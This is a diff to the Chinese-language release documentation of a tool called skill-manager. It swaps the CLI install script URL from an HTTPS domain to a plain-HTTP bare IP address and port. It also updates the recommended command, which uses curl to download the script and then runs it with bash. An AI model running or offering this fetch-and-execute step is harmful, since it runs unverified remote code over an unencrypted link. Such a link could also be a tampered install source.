@@ -16,7 +16,7 @@
 - GitHub Releases：`https://github.com/xianzhiqiyue/skill-manager/releases`
 - Web 门户：`https://skill-home.dev`
 - Registry API：`https://registry.skill-home.dev`
-- CLI 安装脚本：`https://get.skill-home.dev/install.sh`
+- CLI 安装脚本：`http://47.122.112.210:8080/install.sh`
 
 ### 发布职责
 
@@ -48,7 +48,7 @@
 推荐入口：
 
 ```bash
-curl -fsSL https://get.skill-home.dev/install.sh -o /tmp/skill-home-install.sh
+curl -fsSL http://47.122.112.210:8080/install.sh -o /tmp/skill-home-install.sh
 bash /tmp/skill-home-install.sh
 ```
 
